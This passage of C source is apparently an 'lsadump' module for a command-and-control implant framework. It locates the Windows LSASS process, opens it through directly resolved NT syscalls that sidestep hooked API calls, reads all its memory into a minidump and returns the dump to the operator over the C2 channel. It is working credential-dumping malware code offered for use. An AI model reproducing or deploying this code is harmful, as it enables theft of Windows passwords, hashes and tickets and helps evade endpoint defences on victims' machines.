    db_append(dump, &m64hdr, sizeof(m64hdr));

    /* Descriptors */
    for (i = 0; i < (DWORD)region_count; i++)
    {
        MDMP_MEMORY_DESCRIPTOR64 desc;
        desc.StartOfMemoryRange = regions[i].base;
        desc.DataSize = regions[i].size;
        db_append(dump, &desc, sizeof(desc));
    }

    /* ---- Phase 3: Read and append memory data ---- */

    /* Read buffer — 64 KB at a time */
    unsigned char *rbuf = (unsigned char *)malloc(0x10000);
    if (rbuf == NULL)
    {
        free(regions);
        return 0;
    }

    for (i = 0; i < (DWORD)region_count; i++)
    {
        ULONGLONG base = regions[i].base;
        ULONGLONG remaining = regions[i].size;

        while (remaining > 0)
        {
            SIZE_T chunk = (remaining > 0x10000) ? 0x10000 : (SIZE_T)remaining;
            SIZE_T bytes_read = 0;

            status = sc_NtReadVirtualMemory(&sce_ReadVirtualMemory,
                                            proc, (PVOID)(ULONG_PTR)base,
                                            rbuf, chunk, &bytes_read);

            if (NT_SUCCESS(status) && bytes_read > 0)
            {
                db_append(dump, rbuf, bytes_read);
            }
            else
            {
                /* Unreadable region — fill with zeros to keep offsets valid */
                db_append_zeros(dump, chunk);
            }

            base += chunk;
            remaining -= chunk;
        }
    }

    free(rbuf);
    free(regions);

    return 1;
}

/* ================================================================== */
/* Main handler                                                        */
/* ================================================================== */

static tlv_pkt_t *lsadump_create(c2_t *c2)
{
    DWORD pid = 0;
    int user_pid;
    HANDLE hProcess = NULL;
    OBJ_ATTR oa;
    CLIENT_ID cid;
    NTSTATUS status;
    PROCESS_BASIC_INFORMATION pbi;
    ULONG retlen;
    tlv_pkt_t *result;

    if (!g_sc_ready)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    /* Use PID from request, or auto-find LSASS */
    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_LSA_PID, &user_pid) >= 0 &&
        user_pid > 0)
    {
        pid = (DWORD)user_pid;
    }
    else
    {
        pid = find_lsass_pid();
    }

    if (pid == 0)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    /* Open target process via syscall */
    memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);

    memset(&cid, 0, sizeof(cid));
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    status = sc_NtOpenProcess(&sce_OpenProcess, &hProcess,
                              PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                              &oa, &cid);

    if (!NT_SUCCESS(status) || hProcess == NULL)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    /* Query PEB address for module enumeration */
    memset(&pbi, 0, sizeof(pbi));

    status = sc_NtQueryInformationProcess(&sce_QueryInformationProcess,
                                          hProcess,
                                          0 /* ProcessBasicInformation */,
                                          &pbi, sizeof(pbi), &retlen);

    /* Enumerate modules from remote PEB */
    module_list_t *mods = (module_list_t *)malloc(sizeof(module_list_t));
    if (mods == NULL)
    {
        sc_NtClose(&sce_Close, hProcess);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }
    mods->count = 0;

    if (NT_SUCCESS(status) && pbi.PebBaseAddress != NULL)
    {
        enumerate_modules(hProcess, pbi.PebBaseAddress, mods);
    }

    /* Build minidump */
    dyn_buf_t dump;
    db_init(&dump);

    int ok = build_minidump(hProcess, mods, &dump);

    sc_NtClose(&sce_Close, hProcess);
    free(mods);

    if (!ok || dump.data == NULL || dump.size == 0)
    {
        db_free(&dump);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    /* Build response */
    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_bytes(result, TLV_TYPE_LSA_DATA, dump.data, dump.size);
    tlv_pkt_add_u32(result, TLV_TYPE_LSA_SIZE, (int)dump.size);

    db_free(&dump);

    return result;
}

/* ================================================================== */
/* COT entry                                                           */
/* ================================================================== */

COT_ENTRY
{
    /* Resolve syscalls from PEB-walked ntdll */
    PVOID ntdll = find_ntdll_base();

    if (ntdll != NULL)
    {
        sc_entry_t *table[] = {
            &sce_OpenProcess,
            &sce_Close,
            &sce_QuerySystemInformation,
            &sce_QueryInformationProcess,
            &sce_QueryVirtualMemory,
            &sce_ReadVirtualMemory,
        };
        g_sc_ready = sc_resolve_all(ntdll, table, 6);
    }

    api_call_register(api_calls, LSADUMP_CREATE, (api_t)lsadump_create);
}

#else /* POSIX */

#include <pwny/api.h>
#include <pwny/tab.h>

void register_tab_api_calls(api_calls_t **api_calls)
{
    (void)api_calls;
}

#endif
